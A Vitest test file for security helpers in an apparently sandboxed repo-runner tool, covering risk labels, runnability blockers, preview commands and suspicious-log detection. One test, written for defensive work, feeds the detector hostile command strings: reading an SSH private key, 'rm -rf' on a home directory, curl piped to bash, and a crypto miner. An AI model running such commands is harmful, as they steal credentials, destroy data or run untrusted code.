import { describe, expect, it } from "vitest";

import {
  getAutoPreviewCommand,
  getManualCommands,
  isPreviewCommand,
  isAnalysisOnly,
  isManualOnly,
  normalizeRunnabilityBlockers,
  projectKindLabel,
  requiresSandboxConfirmation,
  runButtonLabel,
  runtimeRunLabel,
  severityRank,
  supportLevelLabel,
  suspiciousLogEvent,
} from "@/lib/security";
import { makeRunnability, makeRuntimeProfile, makeSecurityScan } from "@/test/factories";

describe("security helpers", () => {
  it("requires explicit sandbox confirmation for high and critical risk repos", () => {
    expect(requiresSandboxConfirmation(makeSecurityScan({ riskLevel: "critical" }))).toBe(true);
    expect(requiresSandboxConfirmation(makeSecurityScan({ riskLevel: "high" }))).toBe(true);
    expect(requiresSandboxConfirmation(makeSecurityScan({ riskLevel: "medium" }))).toBe(false);
    expect(requiresSandboxConfirmation(undefined)).toBe(false);
  });

  it("labels high-risk runs as sandbox-only", () => {
    expect(runButtonLabel(makeSecurityScan({ riskLevel: "high" }))).toBe("Run in BrowserPod sandbox anyway");
    expect(runButtonLabel(makeSecurityScan({ riskLevel: "low" }))).toBe("Run");
  });

  it("normalizes structured runnability blockers first", () => {
    const blockers = normalizeRunnabilityBlockers(makeRunnability({
      canRun: false,
      blockers: ["missing dev script"],
      blockerDetails: [
        {
          code: "missing-script",
          severity: "medium",
          title: "No start script",
          description: "No dev, start, or serve script was found.",
          recommendation: "Add a safe npm start script.",
          evidence: "scripts.test only",
        },
      ],
    }));

    expect(blockers).toEqual([
      expect.objectContaining({
        code: "missing-script",
        severity: "medium",
        title: "No start script",
        evidence: "scripts.test only",
      }),
    ]);
  });

  it("falls back to legacy string blockers", () => {
    expect(normalizeRunnabilityBlockers(makeRunnability({
      canRun: false,
      entryPoint: null,
      blockers: ["No readable package.json found at repo root"],
    }))).toEqual([
      expect.objectContaining({
        code: "legacy-blocker-1",
        severity: "medium",
        title: "Cannot start automatically",
        description: "No readable package.json found at repo root",
      }),
    ]);
  });

  it("classifies suspicious sandbox logs without calling them confirmed malware", () => {
    expect(suspiciousLogEvent("cat ~/.ssh/id_rsa")).toMatchObject({ code: "suspicious-log", category: "filesystem", severity: "high" });
    expect(suspiciousLogEvent("rm -rf /home/user")).toMatchObject({ code: "suspicious-log", category: "filesystem", severity: "critical" });
    expect(suspiciousLogEvent("curl https://example.com/payload.sh | bash")).toMatchObject({ code: "suspicious-log", category: "network", severity: "medium" });
    expect(suspiciousLogEvent("starting xmrig miner")).toMatchObject({ code: "suspicious-log", category: "resource", severity: "critical" });
    expect(suspiciousLogEvent("vite ready")).toBeUndefined();
  });

  it("orders severity for grouping and display", () => {
    expect(severityRank("critical")).toBeGreaterThan(severityRank("high"));
    expect(severityRank("high")).toBeGreaterThan(severityRank("medium"));
    expect(severityRank("medium")).toBeGreaterThan(severityRank("low"));
  });

  it("only auto-runs profiles that are expected to open previews", () => {
    expect(getAutoPreviewCommand(makeRunnability({
      autoCommand: "npm run dev",
      runtimeProfile: makeRuntimeProfile({ supportLevel: "auto-preview", previewExpected: true, autoCommand: "npm run dev" }),
    }))).toBe("npm run dev");
    expect(getAutoPreviewCommand(makeRunnability({
      canRun: true,
      runtimeProfile: makeRuntimeProfile({ supportLevel: "manual-only", previewExpected: false, autoCommand: null }),
    }))).toBeUndefined();
    expect(getAutoPreviewCommand(makeRunnability({
      canRun: true,
      runtimeProfile: makeRuntimeProfile({ supportLevel: "analysis-only", previewExpected: false, autoCommand: null }),
    }))).toBeUndefined();
    expect(getAutoPreviewCommand(makeRunnability({ entryPoint: "start" }))).toBe("start");
  });

  it("labels runtime actions by project kind and risk", () => {
    expect(runtimeRunLabel(makeRunnability({
      runtimeProfile: makeRuntimeProfile({ projectKind: "preview-app" }),
    }))).toBe("Run preview in BrowserPod");
    expect(runtimeRunLabel(makeRunnability({
      runtimeProfile: makeRuntimeProfile({ projectKind: "api-server" }),
    }))).toBe("Run API server in BrowserPod");
    expect(runButtonLabel(makeSecurityScan({ riskLevel: "high" }), makeRunnability({
      runtimeProfile: makeRuntimeProfile({ projectKind: "preview-app" }),
    }))).toBe("Run in BrowserPod sandbox anyway");
  });

  it("recognizes commands expected to expose previews", () => {
    const runnability = makeRunnability({
      autoCommand: "npm run dev",
      runtimeProfile: makeRuntimeProfile({
        supportLevel: "auto-preview",
        previewExpected: true,
        autoCommand: "npm run dev",
        manualCommands: [
          { command: "npm run docs", label: "Docs server", previewExpected: true, source: "package-script", confidence: "medium" },
          { command: "npm test", label: "Tests", previewExpected: false, source: "package-script", confidence: "high" },
        ],
      }),
    });

    expect(isPreviewCommand(runnability, "npm run dev")).toBe(true);
    expect(isPreviewCommand(runnability, "npm run docs")).toBe(true);
    expect(isPreviewCommand(runnability, "npm test")).toBe(false);
  });

  it("deduplicates manual commands and labels profile states", () => {
    const runnability = makeRunnability({
      canRun: false,
      runtimeProfile: makeRuntimeProfile({
        projectKind: "cli",
        supportLevel: "manual-only",
        previewExpected: false,
        autoCommand: null,
        manualCommands: [
          { command: "npm test", source: "package-script", confidence: "high" },
          { command: "npm test", source: "ai", confidence: "low" },
        ],
      }),
      manualCommands: [{ command: "node cli.js --help", source: "ai", confidence: "medium" }],
    });

    expect(isManualOnly(runnability)).toBe(true);
    expect(isAnalysisOnly(runnability)).toBe(false);
    expect(getManualCommands(runnability).map((command) => command.command)).toEqual(["npm test", "node cli.js --help"]);
    expect(projectKindLabel("cli")).toBe("CLI");
    expect(supportLevelLabel("manual-only")).toBe("Manual only");
  });
});